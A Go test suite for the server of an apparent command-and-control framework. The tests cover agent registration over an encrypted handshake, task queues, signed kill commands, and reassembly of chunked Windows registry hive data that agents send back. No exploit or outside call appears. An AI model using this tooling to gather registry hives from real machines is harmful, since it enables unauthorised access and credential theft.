package server

import (
	"crypto/ecdh"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/ashwnn/adverse-go/internal/cryptokeys"
	"github.com/ashwnn/adverse-go/internal/message"
)

const testSecret = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

func newTestServer(t *testing.T) *Server {
	t.Helper()
	srv, err := New(testSecret, slog.Default())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return srv
}

// testEphemeral generates a valid X25519 ephemeral and returns (priv, pub32, pubHex).
func testEphemeral(t *testing.T) (*ecdh.PrivateKey, [32]byte, string) {
	t.Helper()
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("gen ephemeral: %v", err)
	}
	pubBytes := priv.PublicKey().Bytes()
	var pub [32]byte
	copy(pub[:], pubBytes)
	return priv, pub, hex.EncodeToString(pub[:])
}

func TestNewServer(t *testing.T) {
	srv := newTestServer(t)
	if srv.ServerXPriv == nil {
		t.Fatal("ServerXPriv is nil")
	}
	if srv.ServerSignPriv == nil {
		t.Fatal("ServerSignPriv is nil")
	}
	if srv.KillEpoch.Load() != 1 {
		t.Fatalf("expected initial kill epoch 1, got %d", srv.KillEpoch.Load())
	}
}

func TestComputeBootstrapKey(t *testing.T) {
	srv := newTestServer(t)
	key := srv.ComputeBootstrapKey()
	key2 := srv.ComputeBootstrapKey()
	if key != key2 {
		t.Fatal("bootstrap key not deterministic")
	}
	secretBytes, _ := cryptokeys.Secret32(testSecret)
	if key == secretBytes {
		t.Fatal("bootstrap key should differ from raw secret")
	}
}

func TestECDHSessionKeyDerivation(t *testing.T) {
	srv := newTestServer(t)
	secretBytes, _ := cryptokeys.Secret32(testSecret)
	serverXPriv, _ := cryptokeys.DeriveServerKey(secretBytes)

	ephPriv, ephPub, ephPubHex := testEphemeral(t)

	salt := [16]byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
	agentID := "aabbccdd"

	// Server-side handshake key (static ECDH, authenticates server to agent)
	expectedHandshakeKey, err := cryptokeys.HandshakeKey(serverXPriv, ephPub, salt, agentID)
	if err != nil {
		t.Fatalf("handshake key: %v", err)
	}

	saltHex := hex.EncodeToString(salt[:])
	sid := hex.EncodeToString([]byte("test-sid-00000000"))

	payload := map[string]any{
		"agent_id": agentID,
		"sid":      sid,
		"eph_pub":  ephPubHex,
		"salt":     saltHex,
	}
	payloadBytes, _ := json.Marshal(payload)
	msg := message.Make("hello", agentID, "hello-0", string(payloadBytes), float64(time.Now().Unix()))

	rec := srv.RegisterAgent(agentID, msg)
	if rec == nil {
		t.Fatal("registration failed")
	}

	// Verify handshake key (static-ECDH, authenticates server)
	if rec.HandshakeKey != expectedHandshakeKey {
		t.Fatalf("handshake key mismatch:\n  server:  %x\n  expected: %x", rec.HandshakeKey, expectedHandshakeKey)
	}

	// Verify forward-secret session key: client derives SessionKey(ephPriv,
	// serverEphPub, salt, agentID); server derives SessionKey(serverEphPriv,
	// agentEphPub, salt, agentID). By ECDH commutativity these are equal.
	expectedSessionKey, err := cryptokeys.SessionKey(ephPriv, rec.ServerEphPub, salt, agentID)
	if err != nil {
		t.Fatalf("derive FS session key: %v", err)
	}
	if rec.SessionKey != expectedSessionKey {
		t.Fatalf("session key mismatch:\n  server:  %x\n  expected: %x", rec.SessionKey, expectedSessionKey)
	}
}

func TestSIDReplayRejected(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"
	sid := "unique-sid-12345678"
	_, ephPub, ephPubHex := testEphemeral(t)
	salt := [16]byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
	saltHex := hex.EncodeToString(salt[:])

	makeHello := func() map[string]any {
		payload := map[string]any{
			"agent_id": agentID,
			"sid":      sid,
			"eph_pub":  ephPubHex,
			"salt":     saltHex,
		}
		b, _ := json.Marshal(payload)
		return message.Make("hello", agentID, "hello-0", string(b), float64(time.Now().Unix()))
	}
	_ = ephPub

	rec := srv.RegisterAgent(agentID, makeHello())
	if rec == nil {
		t.Fatal("first registration failed")
	}

	// Second with same SID should fail
	rec2 := srv.RegisterAgent(agentID, makeHello())
	if rec2 != nil {
		t.Fatal("replayed SID should be rejected")
	}
}

func TestSIDLRUBound(t *testing.T) {
	srv := newTestServer(t)
	srv.MaxSIDs = 10
	agentID := "aabbccdd"
	_, ephPub, ephPubHex := testEphemeral(t)
	salt := [16]byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
	saltHex := hex.EncodeToString(salt[:])
	_ = ephPub

	for i := 0; i < 15; i++ {
		sid := fmt.Sprintf("sid-%04d", i)
		payload := map[string]any{
			"agent_id": agentID,
			"sid":      sid,
			"eph_pub":  ephPubHex,
			"salt":     saltHex,
		}
		b, _ := json.Marshal(payload)
		msg := message.Make("hello", agentID, "hello-0", string(b), float64(time.Now().Unix()))
		srv.RegisterAgent(agentID, msg)
	}

	srv.mu.Lock()
	n := len(srv.SeenSIDs)
	srv.mu.Unlock()

	if n > srv.MaxSIDs {
		t.Fatalf("SID cache exceeded bound: %d > %d", n, srv.MaxSIDs)
	}
}

func TestTaskFIFO(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"

	srv.EnqueueTask(agentID, "task-1", "noop", nil)
	srv.EnqueueTask(agentID, "task-2", "sleep", map[string]any{"seconds": 5})
	srv.EnqueueTask(agentID, "task-3", "extract", nil)

	for _, expected := range []string{"task-1", "task-2", "task-3"} {
		msg, ok := srv.NextTask(agentID)
		if !ok {
			t.Fatalf("expected task %s, queue exhausted", expected)
		}
		if msg["task_id"] != expected {
			t.Fatalf("expected %s, got %v", expected, msg["task_id"])
		}
		if tk, ok := srv.GetTask(expected); !ok || tk.State != TaskDispatched {
			t.Fatalf("task %s should be dispatched, got %+v", expected, tk)
		}
	}

	if _, ok := srv.NextTask(agentID); ok {
		t.Fatal("expected queue to be empty after three pops")
	}
}

func TestKillEpochMonotonic(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"

	_, epoch1, err := srv.EnqueueKill(agentID, "kill")
	if err != nil {
		t.Fatal(err)
	}
	_, epoch2, err := srv.EnqueueKill(agentID, "kill")
	if err != nil {
		t.Fatal(err)
	}

	if epoch2 <= epoch1 {
		t.Fatalf("kill epochs not monotonic: %d <= %d", epoch2, epoch1)
	}
}

func TestKillEpochMonotonicAcrossRestart(t *testing.T) {
	dir := t.TempDir()

	srv1, _ := New(testSecret, slog.Default())
	srv1.StateDir = dir
	agentID := "aabbccdd"
	srv1.RegisterAgent(agentID, makeTestHello(t, agentID, "sid-1"))
	_, epoch1, _ := srv1.EnqueueKill(agentID, "kill")

	srv2, _ := New(testSecret, slog.Default())
	srv2.StateDir = dir
	if err := srv2.LoadState(); err != nil {
		t.Fatal(err)
	}
	_, epoch2, err := srv2.EnqueueKill(agentID, "kill")
	if err != nil {
		t.Fatal(err)
	}

	if epoch2 <= epoch1 {
		t.Fatalf("kill epoch not monotonic across restart: %d <= %d", epoch2, epoch1)
	}
}

func TestKillVerifyRoundTrip(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"
	payload := "kill"

	_, epoch, err := srv.EnqueueKill(agentID, payload)
	if err != nil {
		t.Fatal(err)
	}

	killMsg, ok := srv.NextTask(agentID)
	if !ok {
		t.Fatal("expected 1 kill message")
	}
	sigHex, _ := killMsg["sig"].(string)
	sig, _ := hex.DecodeString(sigHex)

	pub := srv.ServerSignPriv.Public().(ed25519.PublicKey)
	if !cryptokeys.KillVerify(pub, epoch, agentID, payload, sig) {
		t.Fatal("kill verification failed")
	}

	if cryptokeys.KillVerify(pub, epoch, "wrong-agent", payload, sig) {
		t.Fatal("kill verify should fail for wrong agent")
	}

	if cryptokeys.KillVerify(pub, epoch+1, agentID, payload, sig) {
		t.Fatal("kill verify should fail for wrong epoch")
	}

	if cryptokeys.KillVerify(pub, epoch, agentID, "wrong-payload", sig) {
		t.Fatal("kill verify should fail for wrong payload")
	}
}

func TestStateFlushAndLoad(t *testing.T) {
	dir := t.TempDir()
	srv, _ := New(testSecret, slog.Default())
	srv.StateDir = dir

	agentID := "aabbccdd"
	srv.RegisterAgent(agentID, makeTestHello(t, agentID, "sid-1"))

	statePath := filepath.Join(dir, "state.json")
	if _, err := os.Stat(statePath); os.IsNotExist(err) {
		t.Fatal("state.json not created")
	}

	srv2, _ := New(testSecret, slog.Default())
	srv2.StateDir = dir
	if err := srv2.LoadState(); err != nil {
		t.Fatal(err)
	}

	agents := srv2.ListAgents()
	if len(agents) != 1 {
		t.Fatalf("expected 1 agent after load, got %d", len(agents))
	}
}

func TestResultsBounded(t *testing.T) {
	srv := newTestServer(t)
	srv.MaxResultsPerAgent = 5
	agentID := "aabbccdd"

	srv.RegisterAgent(agentID, makeTestHello(t, agentID, "sid-res"))

	for i := 0; i < 10; i++ {
		msg := message.Make("result", agentID, fmt.Sprintf("r%d", i), "{}", float64(time.Now().Unix()))
		srv.HandleMessage(agentID, msg)
	}

	results := srv.ResultsFor(agentID)
	if len(results) != 5 {
		t.Fatalf("expected 5 results (bounded), got %d", len(results))
	}
}

func TestChunkReassembly(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"
	srv.RegisterAgent(agentID, makeTestHello(t, agentID, "sid-chunk"))

	jobID := "job123456789012"
	hive := "SYSTEM"
	path := `\\REGISTRY\\SOFTWARE`
	data := []byte("hello world data")

	hiveBytes := []byte(hive)
	pathBytes := []byte(path)
	chunkWire := make([]byte, 12+len(hiveBytes)+len(pathBytes)+len(data))
	// seq=0
	chunkWire[0] = 0
	chunkWire[1] = 0
	chunkWire[2] = 0
	chunkWire[3] = 0
	// hiveLen
	chunkWire[4] = byte(len(hiveBytes) >> 8)
	chunkWire[5] = byte(len(hiveBytes))
	// pathLen
	chunkWire[6] = byte(len(pathBytes) >> 8)
	chunkWire[7] = byte(len(pathBytes))
	// dataLen
	chunkWire[8] = 0
	chunkWire[9] = 0
	chunkWire[10] = byte(len(data) >> 8)
	chunkWire[11] = byte(len(data))
	copy(chunkWire[12:], hiveBytes)
	copy(chunkWire[12+len(hiveBytes):], pathBytes)
	copy(chunkWire[12+len(hiveBytes)+len(pathBytes):], data)

	resultPayload, _ := json.Marshal(map[string]any{
		"job_id":   jobID,
		"hive":     hive,
		"seq":      float64(0),
		"total":    float64(3),
		"sha256":   "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
		"data_b64": base64.StdEncoding.EncodeToString(chunkWire),
	})
	msg := message.Make("result", agentID, jobID, string(resultPayload), float64(time.Now().Unix()))
	srv.HandleMessage(agentID, msg)

	srv.mu.Lock()
	ch, ok := srv.Chunks[jobID]
	srv.mu.Unlock()

	if !ok {
		t.Fatal("chunk not found")
	}
	if len(ch.Chunks) != 1 {
		t.Fatalf("expected 1 chunk, got %d", len(ch.Chunks))
	}
	if string(ch.Chunks[0].data) != "hello world data" {
		t.Fatalf("chunk data mismatch: %q", string(ch.Chunks[0].data))
	}
	if ch.Chunks[0].hive != "SYSTEM" {
		t.Fatalf("chunk hive mismatch: %q", ch.Chunks[0].hive)
	}
}

// --- H-3 tests: per-job chunk bounds ---

func makeTestChunkWire(seq uint32, data []byte) []byte {
	hive := "SYS"
	path := `\R`
	hiveBytes := []byte(hive)
	pathBytes := []byte(path)
	chunkWire := make([]byte, 12+len(hiveBytes)+len(pathBytes)+len(data))
	chunkWire[0] = byte(seq >> 24)
	chunkWire[1] = byte(seq >> 16)
	chunkWire[2] = byte(seq >> 8)
	chunkWire[3] = byte(seq)
	chunkWire[4] = byte(len(hiveBytes) >> 8)
	chunkWire[5] = byte(len(hiveBytes))
	chunkWire[6] = byte(len(pathBytes) >> 8)
	chunkWire[7] = byte(len(pathBytes))
	dl := uint32(len(data))
	chunkWire[8] = byte(dl >> 24)
	chunkWire[9] = byte(dl >> 16)
	chunkWire[10] = byte(dl >> 8)
	chunkWire[11] = byte(dl)
	off := 12
	copy(chunkWire[off:], hiveBytes)
	off += len(hiveBytes)
	copy(chunkWire[off:], pathBytes)
	off += len(pathBytes)
	copy(chunkWire[off:], data)
	return chunkWire
}

func TestChunkPerJobCountLimit(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"
	srv.RegisterAgent(agentID, makeTestHello(t, agentID, "sid-bounds"))
	jobID := "job-bounds-count"
	data := []byte("x")

	// Send exactly MaxChunksPerJob chunks — all should be accepted.
	for i := 0; i < MaxChunksPerJob; i++ {
		seq := uint32(i)
		cw := makeTestChunkWire(seq, data)
		payload, _ := json.Marshal(map[string]any{
			"job_id":   jobID,
			"data_b64": base64.StdEncoding.EncodeToString(cw),
		})
		msg := message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix()))
		srv.HandleMessage(agentID, msg)
	}

	srv.mu.Lock()
	ch, ok := srv.Chunks[jobID]
	srv.mu.Unlock()
	if !ok {
		t.Fatal("chunk not found")
	}
	if len(ch.Chunks) != MaxChunksPerJob {
		t.Fatalf("expected %d chunks, got %d", MaxChunksPerJob, len(ch.Chunks))
	}

	// Send one more — should be rejected.
	extraSeq := uint32(MaxChunksPerJob)
	cw := makeTestChunkWire(extraSeq, data)
	payload, _ := json.Marshal(map[string]any{
		"job_id":   jobID,
		"data_b64": base64.StdEncoding.EncodeToString(cw),
	})
	msg := message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix()))
	srv.HandleMessage(agentID, msg)

	srv.mu.Lock()
	ch2 := srv.Chunks[jobID]
	srv.mu.Unlock()
	if len(ch2.Chunks) != MaxChunksPerJob {
		t.Fatalf("expected %d chunks after reject, got %d", MaxChunksPerJob, len(ch2.Chunks))
	}
}

func TestChunkPerJobBytesLimit(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"
	srv.RegisterAgent(agentID, makeTestHello(t, agentID, "sid-bounds-bytes"))
	jobID := "job-bounds-bytes"

	// Send chunks that approach the MaxBytesPerJob limit.
	chunkPayload := make([]byte, 1024*1024) // 1MB per chunk
	for i := range chunkPayload {
		chunkPayload[i] = byte(i % 256)
	}

	sent := 0
	for sent+1024*1024 <= MaxBytesPerJob {
		cw := makeTestChunkWire(uint32(sent/(1024*1024)), chunkPayload)
		payload, _ := json.Marshal(map[string]any{
			"job_id":   jobID,
			"data_b64": base64.StdEncoding.EncodeToString(cw),
		})
		msg := message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix()))
		srv.HandleMessage(agentID, msg)
		sent += 1024 * 1024
	}

	srv.mu.Lock()
	ch, ok := srv.Chunks[jobID]
	srv.mu.Unlock()
	if !ok {
		t.Fatal("chunk not found")
	}
	if ch.ChunkSize != sent {
		t.Fatalf("expected %d bytes, got %d", sent, ch.ChunkSize)
	}

	// One more chunk should push over the limit and be rejected.
	cw := makeTestChunkWire(uint32(len(ch.Chunks)), chunkPayload)
	payload, _ := json.Marshal(map[string]any{
		"job_id":   jobID,
		"data_b64": base64.StdEncoding.EncodeToString(cw),
	})
	msg := message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix()))
	srv.HandleMessage(agentID, msg)

	srv.mu.Lock()
	ch2 := srv.Chunks[jobID]
	srv.mu.Unlock()
	if ch2.ChunkSize > MaxBytesPerJob {
		t.Fatalf("bytes cap exceeded: %d > %d", ch2.ChunkSize, MaxBytesPerJob)
	}
}

// A chunked task must not complete from the last-index chunk alone: every
// sequence 0..total-1 has to be present.
func TestChunkCompletionRequiresAllChunks(t *testing.T) {
	srv := newTestServer(t)
	agentID := "aabbccdd"
	jobID := "job-missing-chunk"
	srv.EnqueueTask(agentID, jobID, "extract", map[string]any{"job_id": jobID})

	send := func(seq int) {
		cw := makeTestChunkWire(uint32(seq), []byte("chunk-data"))
		payload, _ := json.Marshal(map[string]any{
			"job_id":   jobID,
			"seq":      float64(seq),
			"total":    float64(3),
			"data_b64": base64.StdEncoding.EncodeToString(cw),
		})
		srv.HandleMessage(agentID, message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix())))
	}

	send(0)
	send(2) // includes the final index, but chunk 1 is missing

	tk, _ := srv.GetTask(jobID)
	if tk.State == TaskCompleted {
		t.Fatal("task completed despite missing chunk 1")
	}
	if _, ok := srv.GetReassembledByHive(jobID); ok {
		t.Fatal("reassembly reported complete with a missing chunk")
	}

	send(1)
	tk, _ = srv.GetTask(jobID)
	if tk.State != TaskCompleted {
		t.Fatalf("task should complete once all chunks present, got %s", tk.State)
	}
	byHive, ok := srv.GetReassembledByHive(jobID)
	if !ok || len(byHive) != 1 {
		t.Fatalf("expected complete single-hive reassembly, got %v (ok=%v)", byHive, ok)
	}
	if got := len(byHive["SYS"]); got != 3*len("chunk-data") {
		t.Fatalf("reassembled %d bytes, want %d", got, 3*len("chunk-data"))
	}
}

// Terminal chunk state remains retrievable within the retention window and is
// pruned lazily after it.
func TestChunkRetentionPrunesTerminalJobs(t *testing.T) {
	srv := newTestServer(t)
	srv.ChunkRetention = 10 * time.Millisecond
	agentID := "aabbccdd"
	jobID := "job-retention"
	srv.EnqueueTask(agentID, jobID, "extract", map[string]any{"job_id": jobID})

	cw := makeTestChunkWire(0, []byte("x"))
	payload, _ := json.Marshal(map[string]any{
		"job_id":   jobID,
		"total":    float64(1),
		"data_b64": base64.StdEncoding.EncodeToString(cw),
	})
	srv.HandleMessage(agentID, message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix())))

	// Retrieval works inside the retention window.
	if _, ok := srv.GetReassembledByHive(jobID); !ok {
		t.Fatal("completed chunk state not retrievable within retention window")
	}

	time.Sleep(25 * time.Millisecond)
	srv.flushState() // lazy prune on state mutation

	if _, _, ok := srv.ChunkStatus(jobID); ok {
		t.Fatal("terminal chunk state retained past ChunkRetention")
	}
}

// The number of retained terminal chunk jobs is capped, oldest first.
func TestChunkRetentionCap(t *testing.T) {
	srv := newTestServer(t)
	srv.MaxRetainedChunkJobs = 2
	agentID := "aabbccdd"

	for i := 0; i < 3; i++ {
		jobID := fmt.Sprintf("job-cap-%d", i)
		srv.EnqueueTask(agentID, jobID, "extract", map[string]any{"job_id": jobID})
		cw := makeTestChunkWire(0, []byte("x"))
		payload, _ := json.Marshal(map[string]any{
			"job_id":   jobID,
			"total":    float64(1),
			"data_b64": base64.StdEncoding.EncodeToString(cw),
		})
		srv.HandleMessage(agentID, message.Make("result", agentID, jobID, string(payload), float64(time.Now().Unix())))
		time.Sleep(time.Millisecond) // distinct CompletedAt ordering
	}
	srv.flushState()

	if _, _, ok := srv.ChunkStatus("job-cap-0"); ok {
		t.Fatal("oldest terminal chunk job should be evicted by the cap")
	}
	for _, id := range []string{"job-cap-1", "job-cap-2"} {
		if _, _, ok := srv.ChunkStatus(id); !ok {
			t.Fatalf("recent terminal chunk job %s should be retained", id)
		}
	}
}

func TestListAgents(t *testing.T) {
	srv := newTestServer(t)
	srv.RegisterAgent("aa", makeTestHello(t, "aa", "sid-aa"))
	srv.RegisterAgent("bb", makeTestHello(t, "bb", "sid-bb"))

	agents := srv.ListAgents()
	if len(agents) != 2 {
		t.Fatalf("expected 2 agents, got %d", len(agents))
	}
}

// Agent key material is accessed via snapshots (never a live mutable pointer),
// and sequence allocation is serialized under the server lock.
func TestSnapshotAgentRecord(t *testing.T) {
	srv := newTestServer(t)
	srv.RegisterAgent("aa", makeTestHello(t, "aa", "sid-aa"))

	snap, ok := srv.SnapshotAgentRecord("aa")
	if !ok {
		t.Fatal("expected snapshot")
	}
	if snap.Prefix == [3]byte{} {
		t.Fatal("expected non-empty session prefix")
	}
	if snap.SessionKey == [32]byte{} {
		t.Fatal("expected non-empty session key")
	}

	if _, ok := srv.SnapshotAgentRecord("nonexistent"); ok {
		t.Fatal("expected no snapshot for nonexistent agent")
	}

	// TxSeq allocation is serialized and monotonic per agent.
	seq1, ok := srv.NextTxSeq("aa")
	if !ok {
		t.Fatal("expected tx seq")
	}
	seq2, ok := srv.NextTxSeq("aa")
	if !ok {
		t.Fatal("expected tx seq 2")
	}
	if seq2 != seq1+1 {
		t.Fatalf("expected monotonic seq, got %d then %d", seq1, seq2)
	}
}

func TestPollDropFiles(t *testing.T) {
	dir := t.TempDir()
	queueDir := filepath.Join(dir, "queue")
	os.MkdirAll(queueDir, 0700)

	srv, _ := New(testSecret, slog.Default())
	srv.StateDir = dir

	task := map[string]any{
		"agent_id": "aabbccdd",
		"cmd":      "noop",
		"args":     "",
		"ts":       float64(time.Now().Unix()),
	}
	raw, _ := json.Marshal(task)
	fname := filepath.Join(queueDir, "test-drop.json")
	os.WriteFile(fname, raw, 0600)

	srv.PollDropFiles()

	if _, err := os.Stat(fname); !os.IsNotExist(err) {
		t.Fatal("drop file should be deleted")
	}

	if _, ok := srv.NextTask("aabbccdd"); !ok {
		t.Fatal("expected 1 task from drop file")
	}
}

// Symlinks in queue/ must be skipped; the canary target stays untouched.
func TestPollDropFilesSkipsSymlinks(t *testing.T) {
	dir := t.TempDir()
	queueDir := filepath.Join(dir, "queue")
	os.MkdirAll(queueDir, 0700)

	// Create a canary file outside the queue.
	canaryPath := filepath.Join(dir, "canary.txt")
	canaryContent := []byte("I am the canary target")
	if err := os.WriteFile(canaryPath, canaryContent, 0600); err != nil {
		t.Fatal(err)
	}

	// Create a symlink in queue/ pointing to the canary.
	linkPath := filepath.Join(queueDir, "symlink-drop.json")
	if err := os.Symlink(canaryPath, linkPath); err != nil {
		t.Fatal(err)
	}

	srv, _ := New(testSecret, slog.Default())
	srv.StateDir = dir

	srv.PollDropFiles()

	// Symlink should still exist (not removed by PollDropFiles).
	if _, err := os.Lstat(linkPath); err != nil {
		t.Fatalf("symlink should still exist: %v", err)
	}

	// Canary target should be untouched.
	got, err := os.ReadFile(canaryPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != string(canaryContent) {
		t.Fatalf("canary file modified: got %q, want %q", got, canaryContent)
	}

	// No tasks should have been enqueued.
	if _, ok := srv.NextTask("aabbccdd"); ok {
		t.Fatal("expected 0 tasks from symlink")
	}
}

// --- helpers ---

func makeTestHello(t *testing.T, agentID, sid string) map[string]any {
	t.Helper()
	_, _, ephPubHex := testEphemeral(t)
	salt := make([]byte, 16)
	rand.Read(salt)
	payload := map[string]any{
		"agent_id": agentID,
		"sid":      sid,
		"eph_pub":  ephPubHex,
		"salt":     hex.EncodeToString(salt),
	}
	b, _ := json.Marshal(payload)
	return message.Make("hello", agentID, "hello-0", string(b), float64(time.Now().Unix()))
}
